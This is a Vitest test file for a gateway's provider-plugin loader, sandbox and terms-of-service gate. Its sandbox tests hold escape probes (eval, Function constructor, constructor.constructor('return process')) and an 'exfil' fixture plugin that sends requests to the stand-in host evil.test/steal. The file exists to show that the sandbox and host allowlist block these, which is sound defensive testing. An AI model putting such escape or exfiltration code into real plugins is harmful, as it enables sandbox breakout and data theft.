/** Provider plugins (card 21.2): loading, the sandbox, broken plugins and the terms gate. */
import { mkdir, mkdtemp, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';

import type { CanonicalRequest, ModelConfig, ProviderConfig } from '@dirouter/contracts';
import { afterEach, describe, expect, it } from 'vitest';

import { adapterForProvider, clearPluginAdapters } from '../adapters.js';
import { enabledPlugins, loadPlugins, readPlugins } from './loader.js';
import { PluginSandbox } from './sandbox.js';

const REFERENCE_DIR = resolve(import.meta.dirname, '../../../../plugins');

const provider = (plugin: string, options: Record<string, unknown> = {}): ProviderConfig => ({
  id: 'p',
  organizationId: 'o',
  slug: 'plug',
  type: 'plugin',
  name: 'plug',
  baseUrl: 'https://api.cloudflare.com/client/v4',
  enabled: true,
  options: { plugin, ...options },
  credentials: [],
});
const model = {
  id: 'm',
  organizationId: 'o',
  slug: 'm',
  providerId: 'p',
  upstreamModel: '@cf/meta/llama-3.1-8b-instruct',
  enabled: true,
  pricing: { inputPerMTok: '0', outputPerMTok: '0' },
  capabilities: {
    streaming: true,
    tools: false,
    vision: false,
    reasoning: false,
    jsonMode: false,
    embeddings: false,
  },
} satisfies ModelConfig;
const request = (stream = false): CanonicalRequest => ({
  inboundApi: 'openai.chat',
  model: 'm',
  system: [],
  messages: [{ role: 'user', content: [{ type: 'text', text: 'hi' }] }],
  maxOutputTokens: 50,
  stream,
});

async function pluginDir(plugins: Record<string, { manifest?: object; code: string }>) {
  const dir = await mkdtemp(join(tmpdir(), 'dirouter-plugins-'));
  for (const [name, p] of Object.entries(plugins)) {
    await mkdir(join(dir, name));
    await writeFile(
      join(dir, name, 'plugin.json'),
      JSON.stringify(p.manifest ?? { name, version: '1', displayName: name }),
    );
    await writeFile(join(dir, name, 'index.js'), p.code);
  }
  return dir;
}

const ECHO = `module.exports = {
  buildRequest: (i) => ({ url: i.baseUrl + '/chat', headers: { authorization: 'Bearer ' + i.apiKey }, body: i.body }),
};`;

afterEach(() => {
  clearPluginAdapters();
});

describe('the reference plugin', () => {
  it('translates requests, responses and stream events', async () => {
    const loaded = await loadPlugins(REFERENCE_DIR, ['workers-ai']);
    expect(loaded).toMatchObject([{ name: 'workers-ai', status: 'loaded' }]);
    const adapter = adapterForProvider(provider('workers-ai', { accountId: 'acc 1' }));
    const up = adapter.buildRequest({
      provider: provider('workers-ai', { accountId: 'acc 1' }),
      model,
      apiKey: 'cf-token',
      request: request(),
      credentialHeaders: { 'x-extra': '1' },
    });
    expect(up.url).toBe(
      'https://api.cloudflare.com/client/v4/accounts/acc%201/ai/run/@cf/meta/llama-3.1-8b-instruct',
    );
    expect(up.headers).toMatchObject({ authorization: 'Bearer cf-token', 'x-extra': '1' });
    expect(JSON.parse(up.body ?? '')).toEqual({
      messages: [{ role: 'user', content: 'hi' }],
      stream: false,
      max_tokens: 50,
    });
    const res = adapter.parseResponse({
      success: true,
      result: { response: 'Hello!', usage: { prompt_tokens: 5, completion_tokens: 2 } },
    });
    expect(res.content).toEqual([{ type: 'text', text: 'Hello!' }]);
    expect(res.usage).toMatchObject({ inputTokens: 5, outputTokens: 2 });

    const decoder = adapter.createStreamDecoder();
    const events = [
      ...decoder.push({ data: '{"response":"Hel"}' }),
      ...decoder.push({ data: '{"response":""}' }),
      ...decoder.push({ data: '{"response":"lo"}' }),
      ...decoder.push({ data: '{"usage":{"prompt_tokens":5,"completion_tokens":2}}' }),
      ...decoder.push({ data: '[DONE]' }),
    ];
    const text = events
      .filter((e) => e.type === 'text_delta')
      .map((e) => (e as { text: string }).text)
      .join('');
    expect(text).toBe('Hello');
    expect(adapter.parseModelList({ result: [{ name: '@cf/a' }, { name: '@cf/b' }] })).toEqual([
      '@cf/a',
      '@cf/b',
    ]);
  });
});

describe('loading', () => {
  it('loads only enabled plugins, and a broken one never stops the others', async () => {
    const dir = await pluginDir({
      good: { code: ECHO },
      syntax: { code: 'module.exports = {' },
      throws: { code: 'throw new Error("boom at load")' },
      loops: { code: 'while (true) {}' },
      empty: { code: 'module.exports = {}' },
      wrongname: { manifest: { name: 'other', version: '1', displayName: 'x' }, code: ECHO },
      escape: {
        manifest: { name: 'escape', version: '1', displayName: 'x', entry: '../good/index.js' },
        code: ECHO,
      },
      unused: { code: ECHO },
    });
    const result = await loadPlugins(
      dir,
      enabledPlugins('good, syntax throws loops empty wrongname escape missing'),
      { timeoutMs: 20 },
    );
    const byName = Object.fromEntries(result.map((r) => [r.name, r]));
    expect(byName.good?.status).toBe('loaded');
    for (const name of ['syntax', 'throws', 'loops', 'empty', 'wrongname', 'escape', 'missing'])
      expect(byName[name]?.status, name).toBe('failed');
    expect(byName.throws?.error).toMatch(/boom at load/);
    expect(byName.loops?.error).toMatch(/timed out/);
    expect(byName.empty?.error).toMatch(/does not export buildRequest/);
    expect(byName.escape?.error).toMatch(/entry/);
    expect(byName.unused).toBeUndefined();
    expect(adapterForProvider(provider('good')).constructor.name).toBe('PluginAdapter');
    // A provider whose plugin did not load fails its calls, so routing falls back.
    expect(() =>
      adapterForProvider(provider('syntax')).buildRequest({
        provider: provider('syntax'),
        model,
        apiKey: 'k',
        request: request(),
      }),
    ).toThrow(/plugin syntax is not loaded/);
  });

  it('reads manifests without running any code', async () => {
    const dir = await pluginDir({
      careful: { code: 'throw new Error("must not run")' },
    });
    expect(await readPlugins(dir, ['careful'])).toMatchObject([
      { name: 'careful', status: 'available', manifest: { displayName: 'careful' } },
    ]);
  });
});

describe('the sandbox', () => {
  it('has no access to the gateway: no require, process, eval or host prototypes', () => {
    const probe = new PluginSandbox(
      `module.exports = {
        probe: () => ({
          require: typeof require,
          process: typeof process,
          fetch: typeof fetch,
          timers: typeof setTimeout,
          eval: (() => { try { return eval('1 + 1'); } catch (e) { return 'blocked'; } })(),
          fn: (() => { try { return Function('return this')(); } catch (e) { return 'blocked'; } })(),
          ctor: (() => { try { return ({}).constructor.constructor('return process')(); } catch (e) { return 'blocked'; } })(),
        }),
      };`,
      'probe.js',
    );
    expect(probe.call('probe', {})).toEqual({
      require: 'undefined',
      process: 'undefined',
      fetch: 'undefined',
      timers: 'undefined',
      eval: 'blocked',
      fn: 'blocked',
      ctor: 'blocked',
    });
  });

  it('stops runaway calls, refuses async results and keeps logs', () => {
    const sandbox = new PluginSandbox(
      `module.exports = {
        spin: () => { for (;;) {} },
        later: async () => 1,
        chatty: (x) => { log('got', x.n); return x.n * 2; },
      };`,
      'misc.js',
      20,
    );
    expect(() => sandbox.call('spin', {})).toThrow(/timed out/);
    expect(() => sandbox.call('later', {})).toThrow(/must not be async/);
    expect(() => sandbox.call('missing', {})).toThrow(/does not export missing/);
    expect(sandbox.call('chatty', { n: 21 })).toBe(42);
    expect(sandbox.drainLogs()).toEqual(['got 21']);
    expect(sandbox.drainLogs()).toEqual([]);
  });

  it('only lets a plugin call its own hosts', async () => {
    const dir = await pluginDir({
      exfil: {
        code: `module.exports = { buildRequest: () => ({ url: 'https://evil.test/steal' }) };`,
      },
    });
    await loadPlugins(dir, ['exfil']);
    expect(() =>
      adapterForProvider(provider('exfil')).buildRequest({
        provider: provider('exfil'),
        model,
        apiKey: 'k',
        request: request(),
      }),
    ).toThrow(/may not call evil.test/);
  });
});

describe('terms of service gate', () => {
  it('a plugin with a terms warning is unusable until the terms are accepted', async () => {
    const dir = await pluginDir({
      risky: {
        manifest: {
          name: 'risky',
          version: '1',
          displayName: 'Risky',
          termsWarning: { text: 'This may break the provider terms.' },
        },
        code: ECHO,
      },
    });
    await loadPlugins(dir, ['risky']);
    const build = (options: Record<string, unknown>) =>
      adapterForProvider(provider('risky', options)).buildRequest({
        provider: provider('risky', options),
        model,
        apiKey: 'k',
        request: request(),
      });
    expect(() => build({})).toThrow(/needs its terms accepted/);
    const up = build({ termsAcceptedAt: '2026-11-23T00:00:00Z', termsAcceptedBy: 'usr_1' });
    expect(up.url).toBe('https://api.cloudflare.com/client/v4/chat');
  });
});
